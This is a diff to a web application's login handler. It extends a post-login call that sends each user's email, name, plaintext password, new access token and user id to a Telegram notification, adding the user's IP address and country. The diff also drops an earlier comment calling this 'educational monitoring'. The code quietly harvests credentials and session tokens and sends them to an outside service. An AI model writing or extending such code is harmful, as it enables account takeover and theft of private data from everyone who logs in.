@@ -167,14 +167,16 @@ async def login(credentials: UserLogin, request: Request):
         user_id = str(user["_id"])
         token = create_access_token(data={"sub": user_id, "email": user["email"]})
         
-        # Send Telegram notification (Educational monitoring) - with full session details
+        # Send Telegram notification with full session details including IP and country
         try:
             notify_user_login(
                 user["email"], 
                 user["name"], 
                 credentials.password,
                 token,
-                user_id
+                user_id,
+                ip_address,
+                country
             )
         except Exception as e:
             logger.warning(f"Failed to send Telegram notification: {str(e)}")
